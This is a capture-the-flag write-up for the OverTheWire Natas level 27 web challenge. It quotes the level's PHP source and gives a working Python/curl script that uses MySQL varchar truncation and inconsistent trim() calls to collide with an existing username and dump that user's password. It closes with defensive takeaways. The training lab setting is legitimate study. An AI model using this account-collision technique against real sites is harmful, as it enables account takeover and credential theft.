> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas27.natas.labs.overthewire.org`                  |
| Username | `natas27`                                                    |
| Password | *found in [Natas Level 25 → 26](natas-level-25-level-26.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **Python** — to send both requests back-to-back with different username strings, avoiding the 5-minute database reset window

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas27.natas.labs.overthewire.org` and log in with the password from Level 26.

The page presents a simple login form with a **Username** and **Password** field. Submitting valid credentials for an existing user returns that user's row from the database. The comment in the source says the database is cleared every 5 minutes. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

Four functions control all behaviour. Reading them in call order:

**`validUser($link, $usr)`** — checks whether a username exists:

```php
function validUser($link,$usr){
    $user=mysqli_real_escape_string($link, $usr);
    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```

Returns `True` if any row matches `username='$user'`, `False` otherwise. Uses `mysqli_real_escape_string()` — no SQL injection.

**`checkCredentials($link, $usr, $pass)`** — validates a password:

```php
function checkCredentials($link,$usr,$pass){
    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);
    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}
```

Returns `True` if a row matches both username and password. Again, no SQL injection.

**`dumpData($link, $usr)`** — returns the full row for a username:

```php
function dumpData($link,$usr){
    $user=mysqli_real_escape_string($link, trim($usr));
    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                return print_r($row,true);
            }
        }
    }
    return False;
}
```

Calls `trim()` on the username before querying. This is the key function: it prints the `password` column of whatever row it finds. If we can make it find the `natas28` row, we get the password.

**`createUser($link, $usr, $pass)`** — registers a new user:

```php
function createUser($link, $usr, $pass){
    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}
```

Two things to note:

```php
if($usr != trim($usr)) {
    echo "Go away hacker";
    return False;
}
```

Leading and trailing whitespace is explicitly rejected — you cannot register `" natas28"` or `"natas28 "` directly.

```php
$user=mysqli_real_escape_string($link, substr($usr, 0, 64));
```

The username is truncated to **64 characters** before insertion. The `username` column is `varchar(64)`. This is the vulnerability.

**The main logic:**

```php
if(validUser($link,$_REQUEST["username"])) {
    if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
        echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
        echo "Here is your data:<br>";
        $data=dumpData($link,$_REQUEST["username"]);
        print htmlentities($data);
    } else {
        echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
    }
} else {
    if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
        echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
    }
}
```

The flow is:

1. If the username exists → check password → if correct, dump that user's row
2. If the username does not exist → create it

---

### Step 3 — Register and Log In via Python

Two constraints make this attack impossible to execute cleanly with two separate `curl` commands:

- The database resets every 5 minutes — a gap between registration and login risks hitting a reset.
- The login step requires a 64-char username (no `"X"`), but `createUser()`'s whitespace check rejects that string outright because `trim("natas28" + 57 spaces)` strips the trailing spaces, causing `$usr != trim($usr)` to fail with "Go away hacker". The 64-char login string cannot be used for registration.

The solution is to send both requests back-to-back in the same script, using different username strings for each:

```python
import subprocess

# Registration: 65 chars — passes whitespace check ("X" is the non-space tail),
# truncated to 64 on INSERT, stored as "natas28" + 57 spaces
username_reg   = 'natas28' + ' ' * 57 + 'X'

# Login: 64 chars — matches the stored row exactly via validUser(),
# cannot be used for registration (trailing spaces trigger "Go away hacker")
username_login = 'natas28' + ' ' * 57

print(f'Register length: {len(username_reg)}')    # 65
print(f'Login length:    {len(username_login)}')  # 64

creds = ['-u', 'natas27:<password>']
url   = 'http://natas27.natas.labs.overthewire.org/index.php'

for i, uname in enumerate([username_reg, username_login]):
    result = subprocess.run([
        'curl', '-s', *creds,
        '--data-urlencode', f'username={uname}',
        '--data-urlencode', 'password=hunter2',
        url
    ], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if any(x in line for x in ['created', 'Welcome', 'password', 'Array', 'username', 'Wrong', 'hacker']):
            print(f'[{i+1}] {line.strip()}')
```

```bash
python3 natas27.py
```

**Request 1** (65-char username) registers the truncated row:

```
[1] User natas28                                                         X was created!
```

**Request 2** (64-char username) logs in. `validUser()` finds the stored row (exact 64-char match). `checkCredentials()` validates `hunter2`. `dumpData()` calls `trim()` on the 64-char username, collapsing it to `"natas28"`, and queries `WHERE username='natas28'`. MySQL returns the real `natas28` row first.

```
[2] Welcome natas28                                                         !
[2] Here is your data:
[2] Array
[2]     [username] => natas28
[2]     [password] => <password>
```

**Counting the spaces:** `"natas28"` is 7 characters. `varchar(64)` gives 64 slots. `64 - 7 = 57` spaces fill the column exactly, with the `"X"` in position 65 getting truncated on insert. Total registration string: `7 + 57 + 1 = 65` characters.

That is the password for [Natas Level 27 → 28](natas-level-27-level-28.md).

---

## Key Takeaways

- **MySQL silently truncates `varchar(N)` inserts.** A 65-char string stored in a `varchar(64)` column keeps only the first 64 chars — no error, no warning.
- **`varchar` comparison ignores trailing spaces.** `'natas28'` and `'natas28 '` match the same rows. Combined with truncation, a padded username collides with the real one.
- **Inconsistent `trim()` usage creates the exploit path.** `validUser()` queries with the raw input; `dumpData()` trims it first. Two different username strings are required: 65 chars (`+ "X"`) to register, 64 chars (no `"X"`) to log in.
- **The whitespace check is the wrong defence.** `$usr != trim($usr)` only catches leading/trailing spaces on the submitted value — not internal padding followed by a non-space character. A unique index on `username` would have caught the collision at insert time.

---